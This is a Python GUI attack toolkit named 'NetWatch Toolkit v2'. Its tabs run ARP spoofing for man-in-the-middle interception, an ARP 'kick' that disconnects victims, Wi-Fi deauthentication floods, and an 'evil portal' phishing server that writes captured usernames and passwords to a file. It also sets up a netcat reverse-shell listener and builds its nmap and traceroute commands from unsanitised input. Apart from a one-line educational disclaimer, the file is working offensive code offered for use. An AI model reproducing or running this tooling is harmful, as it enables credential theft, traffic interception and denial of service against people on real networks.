#!/usr/bin/env python3
"""
NetWatch Toolkit v2
Author: wickedNull

USAGE:
sudo python3 netwatchV2.py

REQUIREMENTS:
- Python 3.x
- scapy
- nmap
- tkinter
- hostapd, dnsmasq
- netcat (nc)

DISCLAIMER:
For authorized educational use only.
"""

import os
import socket
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from tkinter import *
from tkinter import ttk, filedialog, messagebox
from scapy.all import ARP, Ether, srp, send, RadioTap, Dot11, Dot11Deauth, sendp

# === Globals ===
evil_dir = "netwatch_portal"
os.makedirs(evil_dir, exist_ok=True)
portal_server = None
evil_processes = []
spoofing = False
kicking = False

def is_root():
    return os.geteuid() == 0

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    for _, r in ans:
        return r[Ether].src
    return None

# === Evil Portal Server ===
class PortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = os.path.join(evil_dir, "index.html")
        try:
            with open(path, "rb") as f:
                html = f.read()
        except:
            html = b"<form method='POST' action='/creds'><input name='user'><input name='pass'><input type='submit'></form>"
        self.send_response(200)
        self.end_headers()
        self.wfile.write(html)

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length).decode()
        creds = parse_qs(data)
        with open(os.path.join(evil_dir, "credentials.txt"), "a") as f:
            f.write(f"{self.client_address[0]} - {creds}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"<h1>Connection Failed</h1>")

def start_portal_server():
    global portal_server
    os.chdir(evil_dir)
    portal_server = HTTPServer(('0.0.0.0', 8080), PortalHandler)
    portal_server.serve_forever()

def stop_portal_server():
    global portal_server
    if portal_server:
        portal_server.shutdown()
        portal_server = None

# === GUI ===
if not is_root():
    print("[!] Please run as root.")
    exit()

root = Tk()
root.title("NetWatch Toolkit v2")
root.geometry("1000x700")
style = ttk.Style()
style.theme_use("clam")
style.configure("TNotebook.Tab", background="#222", foreground="#0ff", padding=10)
style.map("TNotebook.Tab", background=[("selected", "#0ff")])
notebook = ttk.Notebook(root)
notebook.pack(expand=1, fill='both')

def create_tab(title):
    tab = Frame(notebook, bg="#1e1e2e")
    notebook.add(tab, text=title)
    output = Text(tab, bg="black", fg="lime", height=10)
    output.pack(expand=1, fill="both", pady=5)
    return tab, output

# Nmap Scanner
tab1, nmap_output = create_tab("Nmap")
Label(tab1, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
nmap_target = Entry(tab1, width=40)
nmap_target.pack()
Button(tab1, text="Scan", command=lambda: threading.Thread(target=lambda: nmap_output.insert(END, subprocess.getoutput(f"nmap -sS -Pn {nmap_target.get()}") + "\n")).start()).pack()

# ARP Scanner
tab2, arp_output = create_tab("ARP Scan")
Label(tab2, text="Network CIDR:", bg="#1e1e2e", fg="#0ff").pack()
arp_target = Entry(tab2, width=40)
arp_target.pack()
def arp_scan():
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=arp_target.get())
    ans, _ = srp(pkt, timeout=2, verbose=0)
    for _, rcv in ans:
        arp_output.insert(END, f"{rcv.psrc} - {rcv.hwsrc}\n")
Button(tab2, text="Scan", command=lambda: threading.Thread(target=arp_scan).start()).pack()

# ARP Spoof
tab3, spoof_output = create_tab("ARP Spoof")
Label(tab3, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
target_ip = Entry(tab3); target_ip.pack()
Label(tab3, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
gateway_ip = Entry(tab3); gateway_ip.pack()
def start_spoof():
    global spoofing
    spoofing = True
    tgt = target_ip.get(); gw = gateway_ip.get()
    def loop():
        tgt_mac = get_mac(tgt); gw_mac = get_mac(gw)
        while spoofing:
            send(ARP(op=2, pdst=tgt, psrc=gw, hwdst=tgt_mac), verbose=0)
            send(ARP(op=2, pdst=gw, psrc=tgt, hwdst=gw_mac), verbose=0)
            spoof_output.insert(END, f"Spoofing {tgt} <-> {gw}\n")
            time.sleep(2)
    threading.Thread(target=loop).start()
def stop_spoof(): global spoofing; spoofing = False
Button(tab3, text="Start", command=start_spoof).pack()
Button(tab3, text="Stop", command=stop_spoof).pack()

# ARP Kick
tab4, kick_output = create_tab("ARP Kick")
Label(tab4, text="Target IP:", bg="#1e1e2e", fg="#0ff").pack()
kick_target = Entry(tab4); kick_target.pack()
Label(tab4, text="Gateway IP:", bg="#1e1e2e", fg="#0ff").pack()
kick_gateway = Entry(tab4); kick_gateway.pack()
def start_kick():
    global kicking
    kicking = True
    target = kick_target.get()
    def loop():
        while kicking:
            send(ARP(op=2, pdst=target, psrc=kick_gateway.get(), hwdst="00:00:00:00:00:00"), verbose=0)
            kick_output.insert(END, f"Kicked {target}\n")
            time.sleep(1)
    threading.Thread(target=loop).start()
def stop_kick(): global kicking; kicking = False
Button(tab4, text="Start Kick", command=start_kick).pack()
Button(tab4, text="Stop Kick", command=stop_kick).pack()

# Traceroute
tab5, trace_output = create_tab("Traceroute")
Label(tab5, text="Target:", bg="#1e1e2e", fg="#0ff").pack()
trace_entry = Entry(tab5); trace_entry.pack()
Button(tab5, text="Run", command=lambda: threading.Thread(target=lambda: trace_output.insert(END, subprocess.getoutput(f"traceroute {trace_entry.get()}") + "\n")).start()).pack()

# Reverse Shell
tab6, shell_output = create_tab("Reverse Shell")
Label(tab6, text="LPORT:", bg="#1e1e2e", fg="#0ff").pack()
lport = Entry(tab6); lport.insert(0, "4444"); lport.pack()
def start_listener(): threading.Thread(target=lambda: os.system(f"nc -lvnp {lport.get()}")).start()
Button(tab6, text="Start Listener", command=start_listener).pack()

# Evil Portal
tab7, portal_output = create_tab("Evil Portal")
def select_html():
    path = filedialog.askopenfilename()
    if path:
        with open(path, "r") as src, open(os.path.join(evil_dir, "index.html"), "w") as dst:
            dst.write(src.read())
Button(tab7, text="Select HTML", command=select_html).pack()
def start_portal(): threading.Thread(target=start_portal_server).start(); portal_output.insert(END, "Portal running...\n")
def stop_portal(): stop_portal_server(); portal_output.insert(END, "Portal stopped\n")
Button(tab7, text="Start", command=start_portal).pack()
Button(tab7, text="Stop", command=stop_portal).pack()
Button(tab7, text="View Creds", command=lambda: portal_output.insert(END, open(os.path.join(evil_dir, "credentials.txt")).read() if os.path.exists(os.path.join(evil_dir, "credentials.txt")) else "No creds yet\n")).pack()

# Deauth
tab8, deauth_output = create_tab("Deauth")
Label(tab8, text="Monitor Interface:", bg="#1e1e2e", fg="#0ff").pack()
iface = Entry(tab8); iface.pack()
Label(tab8, text="Target MAC:", bg="#1e1e2e", fg="#0ff").pack()
client = Entry(tab8); client.pack()
Label(tab8, text="AP MAC:", bg="#1e1e2e", fg="#0ff").pack()
ap = Entry(tab8); ap.pack()
def send_deauth():
    pkt = RadioTap()/Dot11(addr1=client.get(), addr2=ap.get(), addr3=ap.get())/Dot11Deauth()
    sendp(pkt, iface=iface.get(), count=100, inter=0.1)
    deauth_output.insert(END, "Deauth sent\n")
Button(tab8, text="Send", command=lambda: threading.Thread(target=send_deauth).start()).pack()

# Reset
tab9, reset_output = create_tab("Reset")
def reset_all():
    for tab in root.winfo_children():
        for child in tab.winfo_children():
            if isinstance(child, Entry): child.delete(0, END)
    reset_output.insert(END, "All fields cleared.\n")
Button(tab9, text="Reset All", command=reset_all).pack()

root.mainloop()
